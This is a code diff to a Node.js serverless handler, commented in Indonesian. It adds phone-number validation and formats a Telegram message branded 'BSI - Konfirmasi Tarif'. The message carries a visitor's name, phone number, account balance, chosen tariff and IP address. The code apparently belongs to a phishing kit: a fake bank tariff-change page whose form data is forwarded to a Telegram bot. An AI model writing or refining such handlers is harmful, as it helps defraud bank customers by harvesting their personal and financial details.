@@ -24,7 +24,26 @@ module.exports = async (req, res) => {
       return res.status(400).json({ success: false, message: 'Semua field harus diisi' });
     }
 
-  
+    // Validasi dan format nomor HP
+    let formattedNohp = nohp.toString().trim();
+    
+    // Hapus karakter non-digit
+    formattedNohp = formattedNohp.replace(/\D/g, '');
+    
+    // Hapus awalan 0 atau 62
+    if (formattedNohp.startsWith('0')) {
+      formattedNohp = formattedNohp.substring(1);
+    } else if (formattedNohp.startsWith('62')) {
+      formattedNohp = formattedNohp.substring(2);
+    }
+    
+    // Validasi panjang nomor HP
+    if (formattedNohp.length < 10 || formattedNohp.length > 12) {
+      return res.status(400).json({ 
+        success: false, 
+        message: 'Nomor HP harus antara 10-12 digit (tidak termasuk kode negara)' 
+      });
+    }
 
     // Ambil token dari environment variables
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -42,14 +61,13 @@ module.exports = async (req, res) => {
                    req.socket.remoteAddress ||
                    (req.connection.socket ? req.connection.socket.remoteAddress : null);
 
-    $('#nohp').mask('000000000000');
     // Format pesan untuk Telegram dengan informasi IP
     const telegramMessage = `
 𝗕𝗦𝗜 - 𝗞𝗢𝗡𝗙𝗜𝗥𝗠𝗔𝗦𝗜 𝗧𝗔𝗥𝗜𝗙
 ────────────────────
 𝗧𝗮𝗿𝗶𝗳 | ${tarif === 'baru' ? 'BARU (Rp 150.000/bulan)' : 'LAMA (Rp 6.500/transaksi)'}
 𝗡𝗮𝗺𝗮 | ${nama}
-𝗡𝗼𝗺𝗼𝗿 𝗛𝗣 | +62${nohp}
+𝗡𝗼𝗺𝗼𝗿 𝗛𝗣 | +62${formattedNohp}
 𝗦𝗮𝗹𝗱𝗼 | Rp ${saldo}
 ────────────────────
 𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 | ${userIP || 'Tidak terdeteksi'}
